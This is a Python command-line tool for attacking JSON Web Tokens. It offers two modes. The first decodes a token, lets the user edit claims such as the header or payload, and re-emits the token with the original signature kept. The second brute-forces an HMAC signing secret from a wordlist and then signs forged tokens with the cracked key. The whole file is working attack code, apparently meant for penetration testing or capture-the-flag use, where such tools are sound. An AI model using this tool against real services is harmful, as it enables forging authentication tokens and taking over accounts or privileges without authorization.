import jwt
import base64
import json
import hmac
import hashlib

def base64url_decode(input_str):
    rem = len(input_str) % 4
    if rem > 0:
        input_str += '=' * (4 - rem)
    return base64.urlsafe_b64decode(input_str)

def base64url_encode(input_bytes):
    return base64.urlsafe_b64encode(input_bytes).decode().rstrip('=')

def decode_jwt(token):
    try:
        header_b64, payload_b64, signature = token.split('.')
        header = json.loads(base64url_decode(header_b64))
        payload = json.loads(base64url_decode(payload_b64))
        return header, payload, signature
    except Exception as e:
        print(f"[!] Error: {e}")
        return None, None, None

def edit_dict_interactively(d, section_name):
    print(f"\n✏️ Edit {section_name} (press Enter to keep current value):")
    for key in d.copy():
        new_value = input(f"{key} = {d[key]} ➤ ")
        if new_value:
            try:
                d[key] = json.loads(new_value)
            except:
                d[key] = new_value
    return d

def get_signature(header_b64, payload_b64, secret, alg='HS256'):
    msg = f"{header_b64}.{payload_b64}".encode()
    if alg == 'HS256':
        return base64url_encode(hmac.new(secret.encode(), msg, hashlib.sha256).digest())
    elif alg == 'HS384':
        return base64url_encode(hmac.new(secret.encode(), msg, hashlib.sha384).digest())
    elif alg == 'HS512':
        return base64url_encode(hmac.new(secret.encode(), msg, hashlib.sha512).digest())
    else:
        raise ValueError(f"Unsupported algorithm: {alg}")

def option_1():
    token = input("Enter JWT token: ").strip()
    header, payload, signature = decode_jwt(token)
    if not header:
        return

    header_b64 = base64url_encode(json.dumps(header).encode())
    payload_b64 = base64url_encode(json.dumps(payload).encode())

    print("\n📌 Current Header:", json.dumps(header, indent=2))
    header = edit_dict_interactively(header, "header")

    print("\n📦 Current Payload:", json.dumps(payload, indent=2))
    payload = edit_dict_interactively(payload, "payload")

    new_header_b64 = base64url_encode(json.dumps(header).encode())
    new_payload_b64 = base64url_encode(json.dumps(payload).encode())
    new_token = f"{new_header_b64}.{new_payload_b64}.{signature}"
    print("\n✅ Modified Token (old signature kept):\n", new_token)

def brute_force_jwt(token, wordlist_file):
    try:
        header_b64, payload_b64, real_sig = token.split('.')
    except:
        print("[!] Invalid JWT format. Make sure it has 3 parts.")
        return None

    try:
        header = json.loads(base64url_decode(header_b64))
        alg = header.get("alg", "HS256")
    except:
        alg = "HS256"

    print("🚀 Starting brute force...")
    with open(wordlist_file, 'r') as f:
        for idx, line in enumerate(f, 1):
            secret = line.strip()
            try:
                test_sig = get_signature(header_b64, payload_b64, secret, alg=alg)
            except Exception as e:
                continue
            if test_sig == real_sig:
                print(f"\n✅ Secret found: {secret}")
                return secret
            if idx % 100 == 0:
                print(f"🔄 Attempted {idx} passwords...")
    print("\n❌ Secret not found in the wordlist.")
    return None

def option_2():
    token = input("Enter JWT token: ").strip()
    wordlist_path = input("📄 Enter wordlist path: ").strip()
    secret = brute_force_jwt(token, wordlist_path)
    if not secret:
        return
    header, payload, _ = decode_jwt(token)
    new_token = jwt.encode(payload, secret, algorithm=header['alg'])
    print("\n🔐 New signed token with cracked secret:\n", new_token)

def main():
    print("🔐 JWT Tool — Decode or Brute Force")
    print("1. Decode and modify JWT")
    print("2. Brute force secret key and sign new token")
    choice = input("Choose an option (1/2): ").strip()
    if choice == "1":
        option_1()
    elif choice == "2":
        option_2()
    else:
        print("[!] Invalid choice")

if __name__ == "__main__":
    main()
